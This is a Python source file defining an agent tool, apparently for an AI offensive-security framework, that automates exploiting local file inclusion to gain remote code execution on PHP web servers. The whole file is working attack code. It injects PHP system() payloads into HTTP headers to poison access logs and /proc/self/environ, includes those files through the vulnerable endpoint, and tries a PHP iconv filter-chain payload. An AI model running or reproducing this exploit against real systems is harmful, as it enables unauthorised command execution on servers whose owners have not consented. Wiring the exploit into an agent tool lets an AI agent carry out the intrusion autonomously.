from strands import tool
import requests
import time

@tool
def lfi_to_rce(target: str, lfi_endpoint: str, payload: str, log_path: str = "/proc/self/environ") -> str:
    """
    Attempt LFI to RCE via log poisoning or PHP wrappers.
    
    Args:
        target: Base URL of the target
        lfi_endpoint: The LFI vulnerable endpoint 
        payload: PHP payload to inject
        log_path: Target log file or proc path to poison
    
    Returns:
        Result of RCE attempt
    """
    
    results = []
    
    # Method 1: User-Agent log poisoning
    poisoned_ua = f"<?php system('{payload}'); ?>"
    
    try:
        # Inject payload via User-Agent
        response1 = requests.get(
            f"{target}/",
            headers={"User-Agent": poisoned_ua},
            timeout=5
        )
        results.append(f"Payload injected via User-Agent: {response1.status_code}")
        
        # Try to execute via LFI to access logs
        log_paths = [
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log", 
            "/var/log/httpd/access_log",
            "/proc/self/fd/2",
            "/proc/self/environ"
        ]
        
        for log_path in log_paths:
            try:
                response2 = requests.get(
                    f"{target}/{lfi_endpoint}?file={log_path}",
                    timeout=5
                )
                if payload in response2.text or "uid=" in response2.text:
                    results.append(f"RCE SUCCESS via {log_path}: {response2.text[:500]}")
                    break
                else:
                    results.append(f"Log {log_path}: {len(response2.text)} chars, no RCE")
            except:
                results.append(f"Failed to access {log_path}")
                
    except Exception as e:
        results.append(f"Error in log poisoning: {str(e)}")
    
    # Method 2: PHP filter-based approach
    try:
        filter_payload = f"php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode/resource=php://temp"
        response3 = requests.get(
            f"{target}/{lfi_endpoint}?file={filter_payload}",
            timeout=5
        )
        results.append(f"PHP filter attempt: {len(response3.text)} chars")
        
    except Exception as e:
        results.append(f"PHP filter error: {str(e)}")
    
    # Method 3: /proc/self/environ poisoning
    try:
        # Inject payload via HTTP header that might end up in environ
        poison_headers = {
            "User-Agent": f"<?php system('{payload}'); ?>", 
            "Referer": f"<?php system('{payload}'); ?>",
            "X-Forwarded-For": f"<?php system('{payload}'); ?>"
        }
        
        requests.get(f"{target}/", headers=poison_headers, timeout=3)
        
        # Try to execute via environ
        response4 = requests.get(
            f"{target}/{lfi_endpoint}?file=/proc/self/environ",
            timeout=5
        )
        
        if "uid=" in response4.text or payload in response4.text:
            results.append(f"RCE via /proc/self/environ: {response4.text[:500]}")
        else:
            results.append(f"Environ poisoning failed: {len(response4.text)} chars")
            
    except Exception as e:
        results.append(f"Environ poisoning error: {str(e)}")
    
    return f"LFI to RCE Results:\n" + "\n".join(results)